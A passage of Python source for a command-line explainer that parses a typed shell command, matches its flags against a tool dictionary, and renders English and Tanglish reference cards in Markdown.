        if "=" in part and not part.startswith("-"):    # VAR=value env prefix
            continue
        if part in skip:
            continue
        return part.split("/")[-1]                        # strip any path
    return ""


def explain(command_line: str) -> dict | None:
    """Parse a typed/ran command and explain the tool + the flags actually used.

    Returns None when the tool isn't in the dictionary (caller can ask the AI)."""
    command_line = (command_line or "").strip()
    if not command_line:
        return None
    name = base_tool(command_line)
    r = _resolve(name.lower())
    if not r:
        return None
    name, entry = r
    try:
        tokens = shlex.split(command_line, comments=True)
    except ValueError:
        tokens = command_line.split()
    flags = entry.get("flags", {})
    flags_ta = entry.get("flags_ta", {})
    used = []
    seen = set()

    def add(key):
        if key in flags and key not in seen:
            used.append((key, flags[key], flags_ta.get(key, flags[key])))
            seen.add(key)

    for tok in tokens:
        if tok in flags:                         # exact match: sub-command, --flag, or combo like -lvnp
            add(tok)
            continue
        if "=" in tok and tok.split("=", 1)[0] in flags:   # --flag=value  ->  --flag
            add(tok.split("=", 1)[0])
            continue
        if tok.startswith("-") and not tok.startswith("--") and len(tok) > 2:
            for ch in tok[1:]:                   # bundled short flags: -ri -> -r, -i
                add("-" + ch)
    return {
        "name": name,
        "cat": entry.get("cat", ""),
        "purpose": entry.get("purpose", ""),
        "purpose_ta": entry.get("purpose_ta", ""),
        "usage": entry.get("usage", ""),
        "example": entry.get("example", ""),
        "used_flags": used,                      # [(flag, english, tanglish)]
        "all_flags": [(k, flags[k], flags_ta.get(k, flags[k])) for k in flags],
    }


def search(query: str, limit: int = 12) -> list[str]:
    """Tool names matching a query (by name, purpose or category)."""
    q = (query or "").strip().lower()
    if not q:
        return sorted(k for k, v in TOOLS.items() if "alias" not in v)
    hits = []
    for name, entry in TOOLS.items():
        if "alias" in entry:
            continue
        blob = (name + " " + entry.get("purpose", "") + " " + entry.get("purpose_ta", "")
                + " " + entry.get("cat", "")).lower()
        if q in blob:
            hits.append(name)
    return sorted(hits)[:limit]


def to_markdown(info: dict, tanglish: bool = True) -> str:
    """Render an explain()/get() result as a readable reference card."""
    if not info:
        return ""
    lines = [f"### `{info['name']}` — {info.get('cat','')}", ""]
    lines.append(info.get("purpose", ""))
    if tanglish and info.get("purpose_ta"):
        lines.append(f"\n**Tanglish:** {info['purpose_ta']}")
    if info.get("usage"):
        lines.append(f"\n**Usage:** `{info['usage']}`")
    if info.get("example"):
        lines.append(f"\n**Example:** `{info['example']}`")
    used = info.get("used_flags")
    flag_rows = used if used else info.get("all_flags", [])
    if flag_rows:
        heading = "Flags you used" if used else "Common flags"
        lines.append(f"\n**{heading}:**")
        for flag, en, ta in flag_rows:
            if tanglish and ta and ta != en:
                lines.append(f"- `{flag}` — {en}  ·  _{ta}_")
            else:
                lines.append(f"- `{flag}` — {en}")
    return "\n".join(lines)
